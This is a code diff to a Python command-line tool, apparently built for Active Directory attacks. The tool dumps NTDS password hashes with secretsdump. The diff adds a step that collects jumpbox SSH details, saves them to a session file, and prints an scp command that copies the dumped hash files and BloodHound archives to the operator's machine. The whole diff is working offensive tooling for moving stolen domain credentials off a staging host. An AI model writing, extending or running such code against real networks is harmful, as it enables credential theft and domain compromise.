@@ -70,6 +70,53 @@ def print_summary(
     console.print(table)
 
 
+def generate_scp_command(
+    session_data: dict,
+) -> None:
+    """
+    Generate an SCP retrieval command.
+    """
+
+    print_section("Retrieval")
+
+    host = typer.prompt(
+        "SSH Host",
+        default=session_data.get("jumpbox_host", ""),
+        show_default=False,
+    )
+
+    user = typer.prompt(
+        "SSH Username",
+        default=session_data.get("jumpbox_user", ""),
+        show_default=False,
+    )
+
+    ssh_key = typer.prompt(
+        "SSH Key Path",
+        default=session_data.get("ssh_key", ""),
+        show_default=False,
+    )
+
+    session_data["jumpbox_host"] = host
+    session_data["jumpbox_user"] = user
+    session_data["ssh_key"] = ssh_key
+
+    save_session(session_data)
+
+    cwd = Path.cwd()
+
+    command = (
+        f'scp -i "{ssh_key}" '
+        f'"{user}@{host}:{cwd}/hashes/*.ntds" '
+        f'"{user}@{host}:{cwd}/bloodhound/*.zip" '
+        f'./'
+    )
+
+    console.print()
+    console.print(command, style="cyan")
+    console.print()
+
+
 def run_dump() -> None:
     """
     Dump NTDS hashes using secretsdump.
@@ -133,6 +180,12 @@ def run_dump() -> None:
         print_success("NTDS dump completed.")
         print_info(f"Output directory: {output_dir.resolve()}")
         print_summary(session_data)
+
+        #-----------------------------------------------------------------------
+        # Create SCP command
+        #-----------------------------------------------------------------------
+        if typer.confirm("Generate SCP retrieval command?", default=True):
+            generate_scp_command(session_data)
 
     except Exception as exc:
         print_error(str(exc))
